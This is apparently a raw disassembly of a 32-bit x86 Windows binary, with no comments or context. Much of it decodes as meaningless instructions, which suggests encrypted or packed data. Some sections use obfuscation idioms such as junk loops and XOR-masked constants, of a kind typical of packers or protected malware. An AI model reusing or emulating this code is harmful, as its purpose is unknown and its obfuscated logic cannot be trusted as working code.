  40599e:	mov    dl,0x7e
  4059a0:	and    edi,DWORD PTR [ebx-0x13]
  4059a3:	loop   0x40599a
  4059a5:	(bad)  [ecx-0x63]
  4059a8:	add    esi,eax
  4059aa:	sub    DWORD PTR [ebp-0xf],eax
  4059ad:	and    ebp,esi
  4059af:	and    BYTE PTR [edi+0x632744d0],0x42
  4059b6:	inc    ebx
  4059b7:	add    al,0x50
  4059b9:	fnstcw WORD PTR [ebp-0x7e70767f]
  4059bf:	xchg   esp,eax
  4059c0:	add    edi,DWORD PTR [edi-0x34]
  4059c3:	sub    esi,DWORD PTR [ebx-0x553786e3]
  4059c9:	sbb    BYTE PTR [ecx+0x2f7f39c],0xa
  4059d0:	mov    ds:0xcda5612d,eax
  4059d5:	pop    ebx
  4059d6:	ret    
  4059d7:	inc    ebp
  4059d8:	xor    al,0xe
  4059da:	popa   
  4059db:	dec    edx
  4059dc:	lods   al,BYTE PTR ds:[esi]
  4059dd:	push   cs
  4059de:	mov    DWORD PTR [esi+0x43973bb1],ecx
  4059e4:	mov    ebp,0x4602c8fa
  4059e9:	push   es
  4059ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059eb:	fld    DWORD PTR ds:0x580b4ae
  4059f1:	sub    DWORD PTR [esi-0x42bea57f],esp
  4059f7:	xor    al,BYTE PTR [esi-0x54035177]
  4059fd:	mov    ah,0x74
  4059ff:	mov    ecx,0x154486a1
  405a04:	jge    0x4059de
  405a06:	ret    
  405a07:	out    dx,eax
  405a08:	pop    es
  405a09:	fdivr  QWORD PTR [edx-0x1f37635c]
  405a0f:	lds    edx,FWORD PTR [ebx]
  405a11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a12:	jne    0x405a02
  405a14:	adc    al,0xd9
  405a16:	lods   eax,DWORD PTR ds:[esi]
  405a17:	aam    0xeb
  405a19:	xchg   ebp,eax
  405a1a:	int3   
  405a1b:	jnp    0x4059f6
  405a1d:	mov    WORD PTR [edi],ss
  405a1f:	xor    eax,0x407ec61b
  405a24:	adc    eax,0xcc361d88
  405a29:	dec    esi
  405a2a:	xlat   BYTE PTR ds:[ebx]
  405a2b:	jbe    0x405a05
  405a2d:	arpl   sp,di
  405a2f:	push   es
  405a30:	cmp    BYTE PTR [ebx],ah
  405a32:	nop
  405a33:	(bad)
  405a36:	daa    
  405a37:	pop    ds
  405a38:	jg     0x405a04
  405a3a:	pop    ecx
  405a3b:	leave  
  405a3c:	div    DWORD PTR [eax+0x5b95c9a5]
  405a42:	fisub  DWORD PTR [esp+esi*1]
  405a45:	in     eax,dx
  405a46:	adc    bh,dh
  405a48:	xchg   ebp,eax
  405a49:	mov    dh,BYTE PTR [ebx-0x3fefab0b]
  405a4f:	dec    esi
  405a50:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  405a57:	and    edx,0x797b
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fd05
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fcf1,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fcf1
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fcf1,edx
  405a8f:	cmp    DWORD PTR ds:0x42fcf1,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fcf1,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e2db
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fcd9,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fcd9,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fcd9,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e537
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fcd9
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fcd9,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fcd1,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e6f7,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0xc164624d
  405b88:	xor    BYTE PTR [ebp-0x7c],dh
  405b8b:	xor    dh,BYTE PTR [eax+0x70]
  405b8e:	stos   BYTE PTR es:[edi],al
  405b8f:	jle    0x405c01
  405b91:	jo     0x405b96
  405b93:	push   0x50b4b757
  405b98:	jmp    0xb61a7a42
  405b9d:	sbb    al,0xe4
  405b9f:	ror    DWORD PTR [edi-0x6a],0x70
  405ba3:	test   eax,0x4affeb3f
  405ba8:	mov    al,dh
  405baa:	sub    dl,ch
  405bac:	or     al,0x69
  405bae:	retf   0x24c2
  405bb1:	pop    edi
  405bb2:	iret   
  405bb3:	mov    eax,ds:0xa405c73
  405bb8:	cmp    edx,DWORD PTR [ebx]
  405bba:	jnp    0x405c2b
  405bbc:	inc    eax
  405bbd:	cmp    BYTE PTR [edi],dh
  405bbf:	(bad)  
  405bc0:	sti    
  405bc1:	mov    bh,0xb8
  405bc3:	xlat   BYTE PTR ds:[ebx]
  405bc4:	mov    eax,0x510a41ba
  405bc9:	call   DWORD PTR [ecx+0x4e14cc5e]
  405bcf:	xchg   ecx,eax
  405bd0:	dec    esi
  405bd1:	or     al,0x4b
  405bd3:	adc    edx,DWORD PTR [ebx-0x5baac04a]
  405bd9:	(bad)  
  405bdb:	pushf  
  405bdc:	test   eax,0x331181f6
  405be1:	jp     0x405b85
  405be3:	pop    ebp
  405be4:	fidiv  DWORD PTR [ecx]
  405be6:	xchg   ebx,eax
  405be7:	mov    ds:0x91ff6f56,eax
  405bec:	push   ebx
  405bed:	ins    BYTE PTR es:[edi],dx
  405bee:	inc    ebx
  405bef:	mov    eax,ds
  405bf1:	rcr    BYTE PTR [ebx+ebp*2+0xe],cl
  405bf5:	xlat   BYTE PTR ds:[ebx]
  405bf6:	push   esi
  405bf7:	mov    eax,DWORD PTR [edi]
  405bf9:	out    0x71,al
  405bfb:	retf   
  405bfc:	stos   BYTE PTR es:[edi],al
  405bfd:	test   dl,al
  405bff:	pop    esp
  405c00:	adc    eax,0xc4e374dc
  405c05:	cld    
  405c06:	dec    esi
  405c07:	pop    ebp
  405c08:	inc    edi
  405c09:	(bad)  
  405c0a:	or     al,0x8f
  405c0c:	mov    eax,ds:0xed046e20
  405c11:	outs   dx,BYTE PTR ds:[esi]
  405c12:	pop    ebp
  405c13:	xchg   ebx,eax
  405c14:	jl     0x405c50
  405c16:	push   ebx
  405c17:	div    DWORD PTR [eax+0x7fe2497d]
  405c1d:	out    dx,eax
  405c1e:	shr    BYTE PTR [eax+0x73],1
  405c21:	jns    0x405bc7
  405c23:	in     eax,dx
  405c24:	inc    eax
  405c25:	scas   al,BYTE PTR es:[edi]
  405c26:	inc    ebx
  405c27:	jge    0x405c38
  405c29:	mov    bh,0xac
  405c2b:	es xor eax,0x1434b764
  405c31:	xchg   BYTE PTR [ecx-0x295aff40],al
  405c37:	das    
  405c38:	test   DWORD PTR [esi-0x35],ecx
  405c3b:	sub    ah,BYTE PTR [edx]
  405c3d:	inc    BYTE PTR [edi]
  405c3f:	mov    ebx,0xb67b69d
  405c44:	and    edx,DWORD PTR [edx-0x13]
  405c47:	addr16 fdivr st(3),st
  405c4a:	sbb    DWORD PTR [ebx+esi*8-0x1b],ebp
  405c4e:	dec    esi
  405c4f:	mov    WORD PTR [edx-0x4],?
  405c52:	cmp    DWORD PTR fs:[ecx],ebx
  405c55:	sub    DWORD PTR [edx],ecx
  405c57:	xchg   ecx,eax
  405c58:	std    
  405c59:	mov    bh,0x1c
  405c5b:	fist   WORD PTR [ecx+0x4e452fd4]
  405c61:	and    eax,0x18623ef8
  405c66:	and    bl,dl
  405c68:	and    bh,BYTE PTR [edi-0x523c29ba]
  405c6e:	ja     0x405ca2
  405c70:	out    dx,al
  405c71:	pop    esi
  405c72:	stos   BYTE PTR es:[edi],al
  405c73:	mov    ecx,DWORD PTR [esi]
  405c75:	adc    DWORD PTR [ecx],esp
  405c77:	lods   al,BYTE PTR ds:[esi]
  405c78:	adc    esi,ebp
  405c7a:	outs   dx,BYTE PTR ds:[esi]
  405c7b:	mov    ah,0xc6
  405c7d:	mov    ss,WORD PTR [ebp-0x27]
  405c80:	add    bh,ch
  405c82:	scas   eax,DWORD PTR es:[edi]
  405c83:	addr16 (bad) 
  405c85:	jmp    DWORD PTR [edx+0x13c1f057]
  405c8b:	rcr    DWORD PTR [ecx+0x4c9ec2cf],1
  405c91:	pop    eax
  405c92:	das    
  405c93:	std    
  405c94:	mov    al,ds:0x14bfd169
  405c99:	repnz nop
  405c9b:	sub    eax,0xb0637a68
  405ca0:	retf   0xd905
  405ca3:	push   0x18
  405ca5:	or     dl,BYTE PTR [ebp-0x2f]
  405ca8:	scas   eax,DWORD PTR es:[edi]
  405ca9:	mov    DWORD PTR [ecx+ebp*8],esi
  405cac:	mov    ebp,0x5b925125
  405cb1:	sub    dh,BYTE PTR [edi]
  405cb3:	call   0xf5cd:0x156300f6
  405cba:	fimul  DWORD PTR [edi-0x6f]
  405cbd:	and    edi,ebx
  405cbf:	dec    eax
  405cc0:	adc    ecx,DWORD PTR [edi]
  405cc2:	inc    esi
  405cc3:	xor    BYTE PTR [edi-0x5fe896d6],al
  405cc9:	xor    al,BYTE PTR [ebx]
  405ccb:	and    BYTE PTR [esi-0x3612217],bh
  405cd1:	add    dh,dh
  405cd3:	out    dx,al
  405cd4:	sahf   
  405cd5:	(bad)  
  405cd6:	cli    
  405cd7:	adc    eax,0xc6ecd9c
  405cdc:	jmp    FWORD PTR [edx-0x28c25356]
  405ce2:	push   0x21
  405ce4:	je     0x405cb6
  405ce6:	and    esp,ecx
  405ce8:	add    al,0x59
  405cea:	imul   esi,DWORD PTR [edi+0x3475a95d],0x389be885
  405cf4:	jg     0x405d65
  405cf6:	ror    BYTE PTR [ebp-0x6f5899cb],cl
  405cfc:	sub    ah,al
  405cfe:	jnp    0x405d54
  405d00:	push   edi
  405d01:	adc    DWORD PTR [ecx-0x2b8f408d],edi
  405d07:	add    cl,dh
  405d09:	sub    esp,esi
  405d0b:	mov    eax,0xc8818c78
  405d10:	sbb    eax,0x3dbaa632
  405d15:	mov    bl,BYTE PTR ds:0xa212c1e4
  405d1b:	sbb    BYTE PTR [edx+0x5ace31c7],al
  405d21:	out    dx,al
  405d22:	mov    dh,0x67
  405d24:	mov    bh,0xf6
  405d26:	mov    cl,0xd6
  405d28:	add    edx,DWORD PTR [eax+0x70a79ebf]
  405d2e:	ret    
  405d2f:	fxch   st(1)
  405d31:	loop   0x405d91
  405d33:	inc    esp
  405d34:	cmp    al,BYTE PTR [ebx+0x36bc08ce]
  405d3a:	adc    ecx,DWORD PTR [ecx+0x59]
  405d3d:	jnp    0x405cf7
  405d3f:	xor    al,0xbb
  405d41:	sbb    ebx,0xfff61eb4
  405d47:	adc    dl,BYTE PTR [ebp-0x4f]
  405d4a:	dec    esi
  405d4b:	loop   0x405cf8
  405d4d:	mov    esi,eax
  405d4f:	retf   0x2be8
  405d52:	adc    edi,DWORD PTR [ecx+0x31]
  405d55:	jae    0x405d63
  405d57:	sar    BYTE PTR [edx+0x38aa79b6],cl
  405d5d:	pop    edi
  405d5e:	arpl   WORD PTR [ebp+0x27520757],si
  405d64:	or     BYTE PTR [ebx+0x497d8b07],bl
  405d6a:	pop    ecx
  405d6b:	jle    0x405d4f
  405d6d:	fcomp  DWORD PTR [ebx-0x22]
  405d70:	adc    DWORD PTR [esi],edx
  405d72:	arpl   WORD PTR [esi+esi*8+0x5f],sp
  405d76:	sub    DWORD PTR [edx-0x73],ecx
  405d79:	inc    ebp
  405d7a:	test   al,0x77
  405d7c:	mov    esi,0x659f8feb
  405d81:	xor    dl,BYTE PTR [edi-0x5f]
  405d84:	aam    0x38
  405d86:	jne    0x405d7a
  405d88:	clc    
  405d89:	je     0x405d6b
  405d8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d8c:	xchg   bh,bl
  405d8e:	and    al,0x97
  405d90:	cmp    DWORD PTR [ebx+0x26],esi
  405d93:	or     eax,0x99e2686e
  405d98:	cmc    
  405d99:	xor    ebx,DWORD PTR [ebx-0x2e]
  405d9c:	fldcw  WORD PTR [ebx+0x0]
  405d9f:	sbb    DWORD PTR [eax+eax*2],eax
  405da2:	inc    ebp
  405da3:	retf   0xbfae
  405da6:	and    BYTE PTR [ebx+esi*4],bh
  405da9:	adc    BYTE PTR [edi],ah
  405dab:	pushf  
  405dac:	imul   edx,DWORD PTR [edx-0x61],0x50
  405db0:	and    DWORD PTR [edi+0x4d],esp
  405db3:	sbb    eax,0x118d7fbc
  405db8:	loop   0x405e35
  405dba:	aad    0xe2
  405dbc:	mov    cl,0x37
  405dbe:	(bad)  
  405dbf:	dec    esi
  405dc0:	retf   0x30f9
  405dc3:	jl     0x405e17
  405dc5:	mov    esp,0x99eda336
  405dca:	pop    ebx
  405dcb:	pop    edi
  405dcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dcd:	test   DWORD PTR [esi-0x17e2cc29],0x22e5a31c
  405dd7:	sti    
  405dd8:	test   BYTE PTR [ebx],0x7c
  405ddb:	aas    
  405ddc:	mov    bh,BYTE PTR [edx+edi*4]
  405ddf:	mov    DWORD PTR [edx],ebp
  405de1:	add    edx,0x56
  405de4:	iret   
  405de5:	sub    eax,0xbee12ad2
  405dea:	mov    ch,0xfe
  405dec:	cmp    BYTE PTR [ebx-0x1d45d82c],ah
  405df2:	cmp    al,0xd
  405df4:	sbb    bh,dh
  405df6:	push   es
  405df7:	jnp    0x405dc8
  405df9:	mov    esi,0x9f6da27
  405dfe:	inc    edx
  405dff:	sub    al,0x36
  405e01:	out    dx,al
  405e02:	out    0x1d,al
  405e04:	fcmovnu st,st(3)
  405e06:	mov    cl,0xab
  405e08:	push   esp
  405e09:	(bad)  
  405e0a:	jo     0x405df2
  405e0c:	mov    WORD PTR [edi-0x139e74e],es
  405e12:	pop    ebx
  405e13:	data16 mov ah,0xb6
  405e16:	rcl    dh,0xab
  405e19:	mov    edi,0x91a4aa7d
  405e1e:	rol    DWORD PTR [ecx],cl
  405e20:	rcr    DWORD PTR [edi+eiz*2+0x435f46ce],0x39
  405e28:	and    dl,dl
  405e2a:	ss adc eax,edi
  405e2d:	mov    eax,ds:0x59ff9eb4
  405e32:	js     0x405dfb
  405e34:	pushf  
  405e35:	sahf   
  405e36:	in     al,0x48
  405e38:	repnz stos BYTE PTR es:[edi],al
  405e3a:	lds    edx,FWORD PTR [edi-0xc]
  405e3d:	or     dh,ah
  405e3f:	(bad)  
  405e40:	out    dx,al
  405e41:	dec    edi
  405e42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e43:	and    BYTE PTR [eax+0x330c4a49],al
  405e49:	ret    0xc103
  405e4c:	mov    ecx,DWORD PTR [ebp+0xc]
  405e4f:	imul   eax,ecx
  405e52:	add    eax,DWORD PTR [ebp+0x8]
  405e55:	mov    DWORD PTR [ebp+0xc],eax
  405e58:	mov    eax,DWORD PTR [ebp+0xc]
  405e5b:	pop    esi
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e70f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e6ef,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fd01,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0x90
  405ea8:	in     al,0x51
  405eaa:	jb     0x405eea
  405eac:	aas    
  405ead:	jo     0x405f1f
  405eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405eb1
  405eb4:	(bad)  
  405eb5:	xor    ebp,DWORD PTR [edx+edx*4+0x2e]
  405eb9:	push   cs
  405eba:	pop    edx
  405ebb:	shl    BYTE PTR [eax+0x2f735619],0x9c
  405ec2:	sbb    eax,0xf2c605e8
  405ec7:	retf   
  405ec8:	adc    cl,ch
  405eca:	or     al,0xc
  405ecc:	inc    esi
  405ecd:	leave  
  405ece:	aad    0x6f
  405ed0:	xchg   DWORD PTR [edi],ebp
  405ed2:	mov    ah,0xb2
  405ed4:	test   BYTE PTR ds:[edi+0x4],0x69
  405ed9:	shr    BYTE PTR [ebx+0x14],0x3d
  405edd:	and    bh,BYTE PTR [ecx]
  405edf:	in     eax,0xbc
  405ee1:	adc    eax,eax
  405ee3:	adc    ebp,DWORD PTR [ebx+0x7f675966]
  405ee9:	add    eax,0x4091d21b
  405eee:	adc    al,0xe4
  405ef0:	dec    ebp
  405ef1:	arpl   WORD PTR [esi+0x10f8e89d],si
  405ef7:	push   ebp
  405ef8:	shr    DWORD PTR [esi+0x74b06c63],cl
  405efe:	sbb    al,0xd3
  405f00:	adc    eax,0x2f5d5323
  405f05:	daa    
  405f06:	out    0x9c,al
  405f08:	or     BYTE PTR [ecx],ah
  405f0a:	cdq    
  405f0b:	aad    0x1d
  405f0d:	sub    DWORD PTR [eax],ebp
  405f0f:	pop    esi
  405f10:	addr16 mov ebp,0xb026f0b2
  405f16:	fbld   TBYTE PTR [ebp+0x5a]
  405f19:	inc    DWORD PTR [edx]
  405f1b:	xchg   BYTE PTR [eax-0x48],dh
  405f1e:	or     BYTE PTR [ecx+ebp*2+0x54c2bae9],dl
  405f25:	push   ss
  405f26:	jo     0x405f05
  405f28:	es (bad) 
  405f2a:	push   edx
  405f2b:	or     dh,BYTE PTR [esi-0x2cec46da]
  405f31:	dec    esi
  405f32:	repz adc BYTE PTR [ecx-0x64],bl
  405f36:	jns    0x405f9c
  405f38:	test   eax,0xd69380fd
  405f3d:	cwde   
  405f3e:	sub    DWORD PTR [edx-0x5a81b0a4],esp
  405f44:	jmp    0xa0025c05
  405f49:	repz cld 
  405f4b:	iret   
  405f4c:	mov    esp,0xefca1cea
  405f51:	cwde   
  405f52:	test   BYTE PTR [ebx+0x103f6114],cl
  405f58:	xor    dl,BYTE PTR [ecx]
  405f5a:	ins    DWORD PTR es:[edi],dx
  405f5b:	sahf   
  405f5c:	xlat   BYTE PTR ds:[ebx]
  405f5d:	popf   
  405f5e:	dec    ecx
  405f5f:	sbb    eax,0x40787a7a
  405f64:	dec    ebx
  405f65:	cmp    esi,ebp
  405f67:	sub    BYTE PTR [ebx-0xc],0xab
  405f6b:	push   esi
  405f6c:	ror    BYTE PTR ds:0xf9119523,1
  405f72:	and    bh,0xcc
  405f75:	sahf   
  405f76:	adc    DWORD PTR [ebp-0xf],ebp
  405f79:	shl    BYTE PTR [esp+eiz*8-0x43fb5d34],1
  405f80:	sahf   
  405f81:	sbb    DWORD PTR [ebx],esp
  405f83:	sub    DWORD PTR [ecx-0x48],esp
  405f86:	ins    WORD PTR es:[edi],dx
  405f88:	pusha  
  405f89:	test   bl,al
  405f8b:	jg     0x405f66
  405f8d:	pop    ecx
  405f8e:	fwait
  405f8f:	push   0x78bcd236
  405f94:	(bad)  
  405f95:	xchg   ebx,eax
  405f96:	mov    dl,0x19
  405f98:	mov    ch,0x57
  405f9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f9b:	sub    BYTE PTR [ecx-0x5b],ch
  405f9e:	and    ebp,edx
  405fa0:	rol    BYTE PTR [esi+0x60bf9242],cl
  405fa6:	xchg   esp,eax
  405fa7:	and    al,0x7b
  405fa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405faa:	add    eax,0x409c8ea3
  405faf:	mov    esi,0x8bf1e5a0
  405fb4:	ret    
  405fb5:	leave  
  405fb6:	inc    esi
  405fb7:	push   ebx
  405fb8:	mov    ebx,0xf799b37d
  405fbd:	pop    es
  405fbe:	mov    eax,0x6a8721af
  405fc3:	mov    ebp,0x23aa8c29
  405fc8:	add    eax,0xcbb69b0c
  405fcd:	or     al,0xed
  405fcf:	adc    DWORD PTR [esi],ecx
  405fd1:	xchg   ecx,eax
  405fd2:	cld    
  405fd3:	mov    ebp,0x8d29268
  405fd8:	push   edx
  405fd9:	mov    dh,0x26
  405fdb:	mov    bh,0x15
  405fdd:	enter  0xbf3a,0xe1
  405fe1:	xor    esp,ebx
  405fe3:	mov    edx,0x8f0e194b
  405fe8:	pop    es
  405fe9:	rol    BYTE PTR [ebx-0x452d28ac],1
  405fef:	popa   
  405ff0:	outs   dx,DWORD PTR ds:[esi]
  405ff1:	loopne 0x40600c
  405ff3:	pop    ds
  405ff4:	add    BYTE PTR [ecx-0x45],dl
  405ff7:	call   0x3f7e:0x4a82d535
  405ffe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fff:	gs dec edx
  406001:	mov    ah,0x7c
  406003:	xchg   ecx,eax
  406004:	mov    esp,0xb472060f
  406009:	pop    es
  40600a:	dec    ebx
  40600b:	pop    es
  40600c:	mov    eax,ds:0xe317cdd4
  406011:	loopne 0x405fc9
  406013:	jp     0x405fdb
  406015:	outs   dx,DWORD PTR ds:[esi]
  406016:	dec    esp
  406017:	out    dx,eax
  406018:	adc    eax,0x3fb5dab3
  40601d:	aam    0xc9
  40601f:	not    BYTE PTR ds:0x5331ef7c
  406025:	scas   eax,DWORD PTR es:[edi]
  406026:	and    bh,BYTE PTR [ebx-0xd]
  406029:	mov    bl,BYTE PTR [ebx]
  40602b:	in     eax,0x33
  40602d:	ret    
  40602e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40602f:	aas    
  406030:	outs   dx,DWORD PTR ds:[esi]
  406031:	jmp    0x406076
  406033:	push   edi
  406034:	xor    al,0x6c
  406036:	popa   
  406037:	push   cs
  406038:	cmp    ch,BYTE PTR [ecx+0x41]
  40603b:	xor    edx,DWORD PTR [ebx-0x75]
  40603e:	push   edi
  40603f:	pop    es
  406040:	ja     0x406027
  406042:	scas   eax,DWORD PTR es:[edi]
  406043:	xchg   ebx,eax
  406044:	inc    edi
  406045:	or     eax,0xeaf6e0bb
  40604a:	mov    gs:0x61298b36,al
  406050:	in     eax,0x95
  406052:	add    DWORD PTR [eax-0x314eb9e3],edi
  406058:	jno    0x406002
  40605a:	mov    ds:0x729c054a,eax
  40605f:	xor    al,BYTE PTR [eax]
  406061:	or     DWORD PTR ds:0x42fd86,0xae4
  40606b:	mov    DWORD PTR [edx],eax
  40606d:	mov    eax,DWORD PTR [ebp+0xc]
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e118
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fd76,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fcf1,0x42e11c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fcd1,0x42e6fb
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fd82,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fcd5,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fd05
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0x9b935896
  4060dc:	adc    al,0x65
  4060de:	ds jo  0x406151
  4060e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e2:	jg     0x406154
  4060e4:	jo     0x406160
  4060e6:	rcl    DWORD PTR [esi+0x4719dbfe],1
  4060ec:	inc    esp
  4060ed:	mov    dl,0x4c
  4060ef:	aam    0xd5
  4060f1:	dec    esi
  4060f2:	add    eax,0x95185db
  4060f7:	pusha  
  4060f8:	or     edi,esp
  4060fa:	push   0x540a9e7c
  4060ff:	mov    BYTE PTR [ebp+0x5d],0x8
  406103:	fs pop esp
  406105:	jne    0x406152
  406107:	sbb    DWORD PTR [eax+0x7e],esp
  40610a:	fbld   TBYTE PTR [ebx]
  40610c:	inc    esp
  40610d:	push   ebp
  40610e:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  406110:	and    BYTE PTR [ebp+0xc],bl
  406113:	fld    st(7)
  406115:	aas    
  406116:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406117:	adc    al,0x5a
  406119:	jns    0x406126
  40611b:	lock icebp 
  40611d:	inc    eax
  40611e:	jmp    0x7e96:0x9fcdc3e5
  406125:	dec    ebp
  406126:	rcr    BYTE PTR [edx],cl
  406128:	dec    esi
  406129:	xor    ebp,DWORD PTR [eax]
  40612b:	popa   
  40612c:	cmp    esi,DWORD PTR [ecx]
  40612e:	adc    bh,0xed
  406131:	dec    ecx
  406132:	mov    al,0xc0
  406134:	dec    esi
  406135:	push   edx
  406136:	cmp    eax,0x1bfc57ca
  40613b:	inc    esp
  40613c:	pop    ecx
  40613d:	mov    BYTE PTR [edx+0x15fe2523],cl
  406143:	or     ebp,edi
  406145:	jnp    0x406100
  406147:	(bad)
  40614c:	push   ebp
  40614d:	push   ds
  40614e:	loope  0x406145
  406150:	pop    ds
  406151:	mov    bl,0xc9
  406153:	jne    0x406192
  406155:	mov    WORD PTR [ecx+0x77862cf5],es
  40615b:	scas   eax,DWORD PTR es:[edi]
  40615c:	xor    esi,DWORD PTR [ebp+ebx*8-0x932933e]
  406163:	dec    ecx
  406164:	in     al,dx
  406165:	aas    
  406166:	idiv   DWORD PTR [ecx+0x91bae2a]
  40616c:	in     al,dx
  40616d:	mov    ecx,0x31b568f5
  406172:	jo     0x4061be
  406174:	pop    esi
  406175:	mov    dl,ch
  406177:	data16 jae 0x40612d
  40617a:	jl     0x406150
  40617c:	adc    eax,0x72cde290
  406181:	adc    al,0x4
  406183:	cs mov ch,0x45
  406186:	popa   
  406187:	scas   al,BYTE PTR es:[edi]
  406188:	pushf  
  406189:	pcmpgtd mm0,QWORD PTR [esi+0xd]
  40618d:	(bad)  
  40618e:	(bad)  
  40618f:	lea    ecx,[edi+0x6dc8bd9a]
  406195:	push   edx
  406196:	adc    DWORD PTR [ebx],0x1d3d95db
  40619c:	pop    esi
  40619d:	pop    esp
  40619e:	in     eax,0x77
  4061a0:	or     al,0xcf
  4061a2:	adc    dl,BYTE PTR [ebx+ecx*2+0x52]
  4061a6:	movs   WORD PTR es:[edi],WORD PTR cs:[esi]
  4061a9:	imul   ecx,DWORD PTR [esi+0x3f],0xc2b44095
  4061b0:	mov    edx,ebp
  4061b2:	mov    edi,0xb479256b
  4061b7:	enter  0x15f5,0x25
  4061bb:	pop    ss
  4061bc:	jle    0x4061fa
  4061be:	stc    
  4061bf:	add    BYTE PTR [ecx+0x3d7ca5d3],dh
  4061c5:	jne    0x4061ee
  4061c7:	dec    ecx
  4061c8:	mov    cl,BYTE PTR [eax+eiz*2]
  4061cb:	xchg   esp,eax
  4061cc:	jo     0x4061ae
  4061ce:	or     al,0x5e
  4061d0:	mov    eax,0xfe46deb2
  4061d5:	pop    ebp
  4061d6:	adc    edi,esi
